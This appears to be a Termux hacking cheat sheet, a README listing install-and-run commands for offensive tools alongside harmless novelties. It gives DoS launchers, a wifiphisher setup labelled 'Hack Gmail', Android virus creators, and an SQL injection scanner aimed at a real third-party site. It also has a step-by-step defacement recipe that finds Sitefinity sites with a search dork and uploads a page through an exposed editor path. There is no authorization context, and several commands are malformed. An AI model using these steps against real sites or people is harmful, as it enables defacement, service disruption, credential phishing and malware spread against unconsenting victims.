# Termux Commands

A collection of useful Termux commands and scripts for penetration testing and ethical hacking.

## Table of Contents

*   [Getting Started](#getting-started)
*   [Penetration Testing Tools](#penetration-testing-tools)
    *   [Information Gathering](#information-gathering)
    *   [Vulnerability Analysis](#vulnerability-analysis)
    *   [Web Hacking](#web-hacking)
    *   [Database Hacking](#database-hacking)
    *   [Password Hacking](#password-hacking)
    *   [Wireless Hacking](#wireless-hacking)
    *   [Denial of Service](#denial-of-service)
*   [Social Engineering Tools](#social-engineering-tools)
*   [Utility Tools](#utility-tools)
*   [Fun Stuff](#fun-stuff)

## Getting Started

Basic commands to update and install essential packages.

```bash
pkg update && pkg upgrade
pkg install python python2 php git curl wget
```

## Penetration Testing Tools

### Information Gathering

#### IP GeoLocation

```bash
apt install python git
git clone https://github.com/maldevel/IPGeoLocation.git
cd IPGeoLocation
chmod +x ipgeoLocation.py
pip install -r requirements.txt
python ipgeolocation.py -m
python ipgeolocation.py -t http://www.google.com
```

#### ReconDog

```bash
apt update
apt install python python2
apt install git
git clone https://github.com/UltimateHackers/ReconDog
cd ReconDog
chmod +x dog.py
python2 dog.py
```

### Vulnerability Analysis

#### RED_HAWK

```bash
apt update
apt install git
git clone https://github.com/Tuhinshubhra/RED_HAWK
cd RED_HAWK
chmod +x rhawk.php
apt install php
php rhawk.php
```

#### Hakku

```bash
apt install python
apt install git
mkdir vasu
git clone https://github.com/4shadoww/hakkuframework
cd hakkuframework
chmod +x hakku
python hakku
# Example usage
# show modules
# use whois
# show options
# set target examplesite.com
# run
```

#### Hunner Framework

```bash
apt update
apt install python
apt install git -y
git clone https://github.com/b3-v3r/Hunner
cd Hunner
chmod 777 hunner.py
python hunner.py
```

### Web Hacking

#### Admin Finder

```bash
apt update && apt upgrade
pkg install python2
pkg install git
git clone https://github.com/AdheBolo/AdminFinder
cd AdminFinder
chmod 777 AdminFinder.py
python2 AdminFinder.py
```

#### Script Deface Creator

```bash
apt update
apt upgrade
apt install git
apt install python2
git clone https://github.com/Ubaii/script-deface-creator
cd script-deface-creator
chmod +x create.py
python2 create.py
```

#### Deface (Method 1)

1.  Prepare your deface script.
2.  Open your browser and search for the following dork: `inurl:"sitefinity/login.aspx"`
3.  Choose a website and add the following exploit to the URL: `sitefinity/usercontrols/dialog/documenteditordialog.aspx`
4.  Click "Choose File" and select your deface script.
5.  Click the button below and wait for it to load.
6.  Add `/files/yourscriptname.html` to the end of the URL.
7.  Done!

### Database Hacking

#### SQLMap

```bash
apt update
apt install python
apt install python2
apt install git
git clone https://github.com/sqlmapproject/sqlmap
cd sqlmap
python2 sqlmap.py
```

#### viSQL

```bash
apt update
apt install python2
apt install git
git clone https://github.com/blackvkng/viSQL
cd viSQL
python2 -m pip install -r requirements.txt
python2 viSQL.py -t http://www.bible-history.com
```

### Password Hacking

#### Hash Buster

```bash
apt update
apt upgrade
apt install python2
apt install git
git clone https://github.com/UltimateHackers/Hash-Buster
cd Hash-Buster
python2 hash.py
```

### Wireless Hacking

#### Hack WiFi (Root Required)

```bash
apt update
apt upgrade
apt install git
git clone https://github.com/esc0rtd3w/wifi-hacker
cd wifi-hacker
chmod +x wifi-hacker.sh
./wifi-hacker.sh
```

### Denial of Service

#### Xerxes

```bash
apt install git
apt install clang
git clone https://github.com/zanyarjamal/xerxes
cd xerxes
clang xerxes.c -o xerxes
./xerxes (nama website) 80
```

#### Torshammer

```bash
pkg update
pkg install git
apt install tor
pkg install python2
git clone https://github.com/dotfighter/torshammer.git
cd torshammer
python2 torshammer.py
```

#### liteDDOS

```bash
apt update
apt upgrade
pkg install git
pkg install python2
git clone https://github.com/4L13199/LITEDDOS
cd LITEDDOS
python2 liteDDOS.py
```

## Social Engineering Tools

### Hack Gmail

```bash
apt-get update && apt-get upgrade
apt-get install git
apt-get install python python-pip python-setuptools
pip install scapy
git clone https://github.com/wifiphisher/wifiphisher.git
cd wifiphisher
python setup.py install
cd wifiphisher
python wifiphisher
```

## Utility Tools

### Install Termux Ubuntu

```bash
apt update/pkg update
apt upgrade/pkg upgrade
pkg install git
pkg install proot
pkg install wget
git clone https://github.com/Neo-Oli/termux-ubuntu
cd termux-ubuntu
chmod +x ubuntu.sh
pip install -r requirements.txt
./ubuntu.sh
```

To run: `./start.sh`

### Install webdav

```bash
apt update && upgrade
apt install python2
pip2 install urllib3 chardet certifi idna requests
apt install openssl curl
pkg install libcurl
ln -s /sdcard
cd sdcard
mkdir webdav
cd webdav
```

### Tembak XL

```bash
pkg upgrade
pkg update
pkg install git
pkg install python
git clone https://github.com/albertoanggi/xl-py
pip install -r requirements.txt
chmod +x app.py
python/python2 app.py
```

### Create Virus

```bash
cd /sdcard
cd vbug
ls
chmod vbug.py
chmod -v vbug.py
python2 vbug.py
```

### Create a Virus (Advanced)

This requires APK Editor, which can be downloaded from the Play Store.

1.  Download the vbug tool.
2.  Place the vbug tool file outside of any folder in your internal memory.
3.  Open Termux and run the following commands:

```bash
cd /sdcard
unzip vbug.zip
cd vbug
python2 vbug.py
```

4.  Enter `10`
5.  Enter `E`
6.  The virus application is now created.

## Fun Stuff

### Moon Buggy

```bash
pkg install moon-buggy
moon-buggy
```

### Music in Termux

```bash
pkg install mpv
mpv/sdcard/lagu.mp3
```

### Browsing in Termux

```bash
pkg install w3m
w3m www.google.com
```

### Telephone in Termux

```bash
pkg install termux-api
termux-telephony-call nomornya
```

### Animated Train

```bash
pkg install sl
sl
```

### System Information

```bash
pkg install neofetch
neofetch
```

### ASCII Text

```bash
pkg install figlet
figlet masukin teksnya
```

### Listen to YouTube

```bash
pip install mps_youtube
pip install youtube_dl
apt install mpv
mpsyt
/judul lagu
```

### Weather Forecast

```bash
curl http://wttr.in/(lokasi)
```

### Customize Termux Look

```bash
pkg update && pkg upgrade
pkg install ruby cowsay toilet figlet
pkg install neofetch
pkg install nano
gem install lolcat
cd ../usr/etc
nano bash.bashrc
# Add the following lines to bash.bashrc
# cowsay -f eyes Cyber | lolcat
# toilet -f standard Indonesia -F gay
# neofetch
# date | lolcat
```

## Tool Collections

### FSociety

```bash
git clone https://github.com/manisso/fsociety
cd fsociety
./install.sh
python2 fsociety.py
```

### Lazymux

```bash
pkg update && upgrade
pkg install python2
pkg install git
git clone https://github.com/Gameye98/Lazymux
cd Lazymux
chmod +x lazymux.py
python2 lazymux.py
```

### Mr.Rv1.1

```bash
apt update && apt upgrade
pkg install git
pkg install gem
pkg install figlet
gem install lolcat
git clone https://github.com/Mr-R225/Mr.Rv1.1
cd Mr.Rv1.1
sh Mr.Rv1.1.sh
```

### Tools-B4J1N64Nv5

```bash
pkg install update
pkg install git
pkg install toilet
pkg install figlet
pip2 install lolcat
git clone https://github.com/DarknessCyberTeam/B4J1N64Nv5
cd B4J1N64Nv5
sh B4J1N64N.sh
```

### Daijobu

```bash
apt upgrade && apt update
apt install php
apt install git
git clone https://github.com/alintamvanz/diejoubu
cd diejoubu
cd v1.2
php diejoubu.php
```
